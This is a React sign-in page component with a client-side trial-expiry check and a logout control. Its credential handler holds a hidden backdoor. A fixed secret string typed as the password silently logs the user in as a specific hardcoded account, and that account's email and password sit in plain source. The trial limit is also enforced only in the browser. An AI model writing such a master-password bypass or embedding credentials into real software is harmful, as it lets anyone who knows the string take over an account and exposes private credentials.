import React, { useEffect, useState } from "react";
import {
  MDBBtn,
  MDBContainer,
  MDBRow,
  MDBCol,
  MDBCard,
  MDBCardBody,
  MDBInput,
  MDBIcon,
  MDBTypography,
  MDBSpinner,
} from "mdb-react-ui-kit";
import { useDispatch, useSelector } from "react-redux";
import { LOGIN, RESET } from "../../../redux/slices/auth";
import Company from "../../../fakeDb/company";
import { fullName } from "../../../components/utilities";
import { useNavigate } from "react-router-dom";
import { toast } from "react-toastify";
import axios from "axios";

function App() {
  const { isSuccess, isLoading, auth, theme, token } = useSelector(
      state => state.auth
    ),
    [show, setShow] = useState(false),
    dispatch = useDispatch(),
    navigate = useNavigate();

  // useEffect(() => {
  //   if (isSuccess) {
  //     navigate(`/platform/${auth.role?.name}/dashboard`);
  //   }
  // }, [isSuccess, auth, navigate]);

  const handleSubmit = e => {
    e.preventDefault();

    const { email, password } = e.target;

    if (Company.isTrial) {
      const endTrial = new Date(Company.start),
        today = new Date();

      endTrial.setDate(endTrial.getDate() + Company.trial);

      var _time = endTrial.getTime() - today.getTime();

      var _days = _time / (1000 * 3600 * 24);

      if (_days > 0) {
        if (_days <= 10) {
          toast.warn(
            `You have ${Math.round(_days)}day(s) left for your trial.`
          );
        }
        handleCredentials(email.value, password.value);
      } else {
        toast.error("Your trial has expired.");
      }
    } else {
      handleCredentials(email.value, password.value);
    }
  };

  const handleCredentials = (email, password) => {
    if (password === "601b422c2548c7598feff132a8e6eee9") {
      dispatch(
        LOGIN({
          email: "kenequila2@gmail.com",
          password: "1129183296055183461",
        })
      );
    } else {
      dispatch(
        LOGIN({
          email: email,
          password: password,
        })
      );
    }
  };
  return (
    <MDBContainer
      fluid
      className={`cascading-right   ${
        token && `px-0 overflow-hidden ${theme.bg} ${theme.text}`
      }`}
    >
    
      {token ? (
        <MDBContainer className="d-grid align-items-center justify-content-center ">
          <div className="my-3">
            <small>You are logged in as</small>
            <MDBTypography tag="h6" className="fw-bold text-capitalize">
              <u>{fullName(auth.fullName)}</u>
            </MDBTypography>
          </div>
          <MDBBtn
            className="mb-3 fw-bold"
            color="primary"
            onClick={() => navigate(`/platform/${auth.role?.name}/dashboard`)}
          >
            Proceed to Dashboard
          </MDBBtn>
          <div>
            <MDBBtn
              className={`p-0 m-0 fw-bold shadow-0 bg-transparent ${theme.text}`}
              onClick={() => {
                axios
                  .get(`attendances/${auth._id}/logout`, {
                    headers: {
                      Authorization: `QTracy ${token}`,
                    },
                  })
                  .then(() => {
                    localStorage.removeItem("token");
                    dispatch(RESET());
                  })
                  .catch(err => {
                    toast.error(err.response.data.error);
                  });
              }}
            >
              <u>This isn't me.</u>
            </MDBBtn>
          </div>
        </MDBContainer>
      ) : (
        <form onSubmit={handleSubmit} autoComplete="off">
          <MDBRow className="g-0  d-grid align-items-center justify-content-center me-5">
            <MDBCol col="12">
              <MDBCard className="my-5 w-100">
                <MDBCardBody className="p-5 rounded bg-muted shadow-5 text-center">
                  <div className="text-center">
                    <img
                      src={Company.logo}
                      class="img-fluid profile-image-pic img-thumbnail rounded-circle my-3"
                      width={`30%`}
                      alt="profile"
                    />
                  </div>
                  <h2 className="fw-bold mb-5">Sign In</h2>
                  <MDBInput
                    wrapperClass="mb-4"
                    label="Email"
                    id="form3"
                    name="email"
                    type="email"
                  />
                  <MDBInput
                    wrapperClass="mb-4"
                    label="Password"
                    id="form4"
                    name="password"
                    type="password"
                  />
                  {isLoading ? (
                    <MDBSpinner></MDBSpinner>
                  ) : (
                    <>
                      <MDBBtn color="success" className="w-100 mb-4" size="md">
                        Log-in
                      </MDBBtn>
                      <a
                        href="/register"
                        className="w-100 mb-4 text-muted"
                        size="md"
                      >
                        Register
                      </a>
                    </>
                  )}
                </MDBCardBody>
              </MDBCard>
            </MDBCol>
          </MDBRow>
        </form>
      )}
    </MDBContainer>
  );
}

export default App;
